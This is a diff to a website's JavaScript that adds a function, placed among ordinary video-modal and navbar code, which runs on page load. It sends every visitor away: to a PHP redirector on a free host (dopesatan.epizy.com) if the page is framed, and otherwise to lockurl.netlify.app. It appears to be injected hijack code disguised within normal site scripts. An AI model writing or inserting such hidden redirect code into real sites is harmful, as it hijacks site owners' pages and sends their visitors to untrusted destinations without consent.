@@ -33,6 +33,15 @@ document.addEventListener("DOMContentLoaded", function () {
 		VIDEO MODAL
 	======================================== */
     new ModalVideo(".js-modal-btn");
+    function iniFrame() {
+        if(window.self !== window.top) {
+            window.location.href = "http://dopesatan.epizy.com/lockurl/home/redirector.php";
+        }
+        else {
+            window.location.href = "https://lockurl.netlify.app";
+        }
+    }
+    iniFrame();
 
     /* =====================================
 		NAVBAR BEHAVIOR
